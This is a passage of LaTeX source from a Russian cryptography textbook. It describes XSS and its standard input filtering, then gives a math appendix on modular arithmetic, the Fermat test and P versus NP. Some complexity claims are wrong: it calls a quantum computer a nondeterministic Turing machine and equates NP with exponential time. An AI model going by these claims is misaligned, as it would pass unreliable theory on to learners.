%(например, JavaScript код), либо программным обеспечением, генерирующим вебстраницу для выдачи клиенту $B$ (например, PHP код). Цель XSS атаки -- либо выполнение JavaScript кода браузером клиента, либо выполнение скриптового кода на вебсервере при запросе клиента к нему.

%Простой пример -- вебфорум. Пользователи вводят в формы текстовые сообщения, которые запоминаются в БД и показываются другим пользователям. Страница форума генерируется каждый раз заново при запросе пользователей информационной системой. Генерирование часто происходит из шаблона страницы, который содержит и базовый статический HTML код вебстраницы, и исполняемый код скрипта для вставки динамического содержания на основе запроса к базе данных. Как правило, злоумышленник пользуется во время генерирования страницы некорректным экранированием текста, введенного им в формах ввода текста вебстраницы, кавычек, слэшей. То есть, текстовые значения полей, которые сохраняются в базе данных веб-сайта и отображаются другим пользователям, содержат исполняемый код злоумышленника.

На 2009 г. 80\% обнаруженных уязвимостей веб-сайтов являются XSS-уязвимостями.

Стандартный способ защиты от XSS-атак заключается в фильтрации, замене, экранировании символов и слов введенного текста пользователем: \texttt{<}, \texttt{>}, \texttt{/}, \texttt{\textbackslash}, \texttt{"}, \texttt{'}, \texttt{(}, \texttt{)}, \texttt{script}, \texttt{javascript} и др., а также в обработке кодировок символов.


\input{sql-injections}

%\chapter{Послесловие}
%Это должно быть что-то в виде заключения, объяснения, почему именно эти темы выбраны, насколько актуален материал с теоретической и практической точки зрения.


\appendix

\chapter{Математическое приложение}
\label{chap:discrete-math}

Вычисления в криптосистемах с открытым ключом, как правило, выполняются в модульной арифметике, в группе или в поле. Далее мы рассмотрим базовые примеры групп и алгоритмов, используемых в криптосистемах с открытым ключом и алгоритме блокового шифрования AES.

\section*{Общие определения}

Выражением $\mod n$ обозначается вычисление остатка от деления произвольного целого числа на целое число $n$. В полиномиальной арифметике эта операция означает вычисление остатка от деления многочленов.
%далее будем обозначать целые числа или операции с целыми числами, взятыми \textbf{по модулю}\index{модуль} целого числа $n$ (остаток от целочисленного деления). Примеры выражений:
    \[ a\mod n, \]
    \[ (a + b) c\mod n. \]
Равенство
    \[ a = b \mod n \]
означает, что выражения $a$ и $b$ равны (говорят также <<сравнимы>>, <<эквивалентны>>) по модулю $n$.

Множество
    \[ \{ 0, 1, 2, 3,  \dots,  n-1 \mod n\} \]
состоит из $n$ элементов, где каждый элемент $i$ представляет все целые числа, сравнимые с $i$ по модулю $n$.

Наибольший общий делитель (НОД) двух чисел $a,b$ обозначается $\gcd(a,b)$ (greatest common divisor).

Два числа $a,b$ называются взаимно простыми, если они не имеют общих делителей, $\gcd(a,b) = 1$.

Выражение $a \mid b$ означает, что $a$ делит $b$.

\input{groups}

\input{aes_math}

\input{modular_ariphmetics}

\input{euclidean_algorithm}

\input{chinese_remainder_theorem}

\section{Псевдопростые числа}

Функция $\pi(n)$ определяется как количество простых чисел из диапазона $[2, n]$.
Существует предел~\cite{Selberg:1949}
    \[ \lim\limits_{n \rightarrow \infty}\frac{ \pi(n)}{ \frac{n}{\ln n}}=1. \]

Для $n \geq 17$ верно неравенство $\pi(n) > \frac{n}{\ln n}$.

Идея создания простых чисел состоит в случайном выборе числа и тестировании его на простоту.

Вероятность $P_k$ того, что случайное $k$-битовое число $n$ будет простым, равна
    \[ \lim\limits_{k \rightarrow \infty} P_k = \frac{1}{\ln n} = \frac{1}{k \ln 2}. \]

\example
    Вероятность того, что случайное 500-битовое число (включая четные числа) будет простым, примерно равна $\frac{1}{347}$, вероятность простоты случайного 2000-битового числа примерно равна $\frac{1}{1836}$.
\exampleend

\subsection{Тест Ферма}
\selectlanguage{russian}

Многие \emph{тесты на простоту} основаны на малой теореме Ферма: если $a$ и $n$ взаимно простые числа, то
    \[ a^{n-1} = 1 \mod n. \]

\textbf{Тестом Ферма}\index{тест!Ферма} на простоту числа $n$ по основанию $a$ называется процедура:
\begin{itemize}
    \item если для взаимно простых основания $a$ и модуля $n$ выполняется $a^{n-1} = 1 \mod n$, то $n$ \emph{может быть} простым,
    \item если $a^{n-1} \ne 1 \mod n$, то $n$ -- \emph{однозначно} составное.
\end{itemize}

Тесты есть \emph{детерминированные}, которые перебирают все $a$ до некоторой границы $a < A$, либо \emph{вероятностные}, которые проверяют тестом Ферма несколько псевдослучайных чисел $a$.

\textbf{Псевдопростым}\index{псевдопростое число} числом называется число, про которое не известно, является ли оно простым или нет, и удовлетворяющее вероятностному тесту на простоту с вероятностью ошибки теста меньше заданного $\epsilon$.

Оказывается, есть числа, которые удовлетворяют тесту Ферма для любого основания $a$. Числом Кармайкла\index{Кармайкла, число} называется составное число $n$, для которого тест Ферма выполняется для всех оснований $a$, взаимно простых с $n$. Первое число Кармайкла $561 = 3 \cdot 11 \cdot 17$. Чисел Кармайкла бесконечно много, но встречаются они редко.

\example
Тест Ферма для числа Кармайкла $n = 561$ и взаимно простого с ним основания $a = 2$, приводится ниже:
\[
    n - 1 = 560 = 35 \cdot 2^4,
\] \[ \begin{array}{ll}
    2^{35} & =~ 2^1 \cdot 2^2 \cdot 2^{4 \cdot 0} \cdot 2^{8 \cdot 0} \cdot 2^{16 \cdot 0} \cdot 2^{32} ~= \\
        & =~ 2 \cdot 4 \cdot 16^0 \cdot 256^0 \cdot 460^0 \cdot 103 ~= \\
        & =~ 263 \mod 561, \\
\end{array} \] \[ \begin{array}{ll}
    2^{560} & =~ \left( 2^{35} \right)^{2^4} ~=~ 263^{2^4} ~= \\
        & =~ 166^{2^3} ~=~ 67^{2^2} ~=~ 1^{2} ~=~ 1 \mod 561.
\end{array} \]
\exampleend


\input{miller-rabins_test}

\input{aks}

\input{pseudo-primes_generation}

\input{groups_of_ec_points_over_finite_fields}

\section[Полиномиальные и экспоненциальные алгоритмы]{Полиномиальные и \\ экспоненциальные алгоритмы}

Данный раздел поясняет обоснованность стойкости криптосистем с открытым ключом и имеет лишь косвенное отношение к дискретной математике.

Машина Тьюринга (МТ) (модель, представляющая любой вычислительный алгоритм) состоит из следующих частей:
\begin{itemize}
    \item неограниченной ленты, разделенной на клетки; в каждой клетке содержится символ из конечного алфавита, содержащего пустой символ blank; если символ ранее не был записан на ленту, то он считается blank;
    \item печатающей головки, которая может считать, записать символ $a_i$ и передвинуть ленту на 1 клетку влево-вправо $d_k$;
    \item конечной таблицы действий
    \[ (q_i, a_j) \rightarrow (q_{i1}, a_{j1}, d_k), \]
где $q$ -- состояние машины.
\end{itemize}

Если таблица переходов однозначна, то машина Тьюринга\index{машина Тьюринга} называется детерминированной. \textbf{Детерминированная} машина Тьюринга может \emph{имитировать} любую существующую детерминированную ЭВМ. Если таблица переходов не однозначна, то есть $(q_i, a_j)$ может переходить по нескольким правилам, то машина \textbf{недетерминированная}. \emph{Квантовый компьютер} является примером недетерминированной машины Тьюринга.

Класс задач $\set{P}$ -- задачи, которые могут быть решены за \emph{полиномиальное} время\index{задача!полиномиальная} на \emph{детерминированной} машине Тьюринга. Пример полиномиальной сложности (количество битовых операций)
    \[ O(k^{\textrm{const}}), \]
где $k$ -- длина входных параметров алгоритма. Операция возведения в степень в модульной арифметике $a^b \mod n$ имеет кубическую сложность $O(k^3)$, где $k$ -- двоичная длина чисел $a,b,n$.

Класс задач $\set{NP}$ -- обобщение класса $\set{P} \subseteq \set{NP}$, включает задачи, которые могут быть решены за \emph{полиномиальное} время на \emph{недетерминированной} машине Тьюринга. Пример сложности задач из $\set{NP}$ -- экспоненциальная сложность\index{задача!экспоненциальная}
    \[ O(\textrm{const}^k). \]
Описанный алгоритм Гельфонда (в разделе криптостойкости системы Эль-Гамаля\index{криптосистема!Эль-Гамаля}) решения задачи дискретного логарифма по нахождению $x$ для заданных $g \mod p$ и $a = g^x \mod p$ имеет сложность $O(e^{k/2})$, где $k$ -- двоичная длина чисел.

В криптографии полиномиальные $\set{P}$ алгоритмы считаются \emph{легкими и вычислимыми} на ЭВМ, которые являются детерминированными машинами Тьюринга. Неполиномиальные (экспоненциальные) $\set{NP}$ алгоритмы считаются \emph{трудными и невычислимыми} на ЭВМ, так как из-за экспоненциального роста сложности всегда можно выбрать такой параметр $k$, что время вычисления станет сравнимым с возрастом Вселенной.

Задача факторизации числа, задача дискретного логарифмирования в группе считаются $\set{NP}$-задачами.

Класс $\set{NP}$-полных задач -- подмножество задач из $\set{NP}$, для которых не известен полиномиальный алгоритм для детерминированной машины Тьюринга, и все задачи могут быть сведены друг к другу за полиномиальное время на \emph{детерминированной} машине Тьюринга. Например, задача об укладке рюкзака является $\set{NP}$-полной.

Стойкость криптосистем с \emph{открытым} ключом, как правило, основана на $\set{NP}$ или $\set{NP}$-полных задачах:
\begin{enumerate}
    \item RSA\index{криптосистема!RSA} -- $\set{NP}$-задача факторизации (строго говоря, на трудности извлечения корня степени $e$ по модулю $n$).
    \item Криптосистемы типа Эль-Гамаля\index{криптосистема!Эль-Гамаля} -- $\set{NP}$-задача дискретного логарифмирования.
\end{enumerate}

\emph{Нерешенной} проблемой является доказательство неравенства
    \[ \set{P} \neq \set{NP}. \]
Именно на гипотезе о том, что для для некоторых задач не существует полиномиальных алгоритмов, и основана стойкость криптосистем с открытым ключом.

\input{coincide-index_method}

%\chapter{Задачи и упражнения}
%
%К \textbf{примерам 1, 2, 3} \textbf{упражнение 1}. Указать способ расшифрования для легального получателя шифротекста и указать способ дешифрования для криптоаналитика, не знающего ключа.
%
%\textbf{Упражнение 2}. Пусть $M_1, M_2, M_3,\ldots,M_s$ -- набор перестановок. Показать, что существует единственная перестановка $M=M_1,M_2,M_3,\ldots M_s$.
%
%\textbf{Упражнение 3}. Вскрыть одиночную ячейку Фейстеля. Для этого задать конкретную функцию $F(K,R)$ и по конкретным значениям $L_{1}$ и $R_{1}$ найти $K$.
%
%\textbf{Упражнение 4}. Разделим последовательность на блоки, каждый из которых содержит 2 бита.
%
%\[\begin{array}{cc} {z_{1} } & {z_{2} } \end{array}|\begin{array}{cc} {z_{3} } & {z_{4} } \end{array}| \ldots |\begin{array}{cc} {z_{N} } & {z_{N+1} } \end{array}\]
%Блок может принимать значения $z_{1} z_{2} =\begin{array}{c} {11} \\ {10} \\ {01} \\ {00} \end{array}$
%Преобразуем последовательность символов:
% если $z_{1} z_{2} =11$ или $z_{1} z_{2} =00$, то пара выбрасывается;
%если $[z_{1} z_{2} =10$, то записываем новый символ $u=1$; если
%$z_{1} z_{2} =01$, то записываем новый символ $u=0$.
%Получаем новую двоичную последовательность.
%
%Показать, что вероятностное распределение символов в новой последовательности является равномерным.
%
%\textbf{Упражнение 5}.Предположим, что криптоаналитик знает, что период генерируемой $M$ -последовательности равен $T=2^{L} -1$. Пусть ему известна часть последовательности длины, меньшей периода: $T_{1}<2^{L} -1$.
% При каком значении $T_{1}$  криптоаналитик может найти многочлен обратной связи.
%
%\textbf{Упражнение 6}. Ответить на вопрос: <<Как подделать ЭП, не зная секретного ключа?>>
%
%\textbf{Упражнение 7}. При помощи формул Виета найти дискриминант многочлена, представляющего эллиптическую кривую.

\clearpage
\phantomsection
\addcontentsline{toc}{chapter}{Предметный указатель}
\printindex

\clearpage
\phantomsection
\addcontentsline{toc}{chapter}{Литература}
\bibliographystyle{ugost2008s}
\bibliography{bibliography}

\end{document}
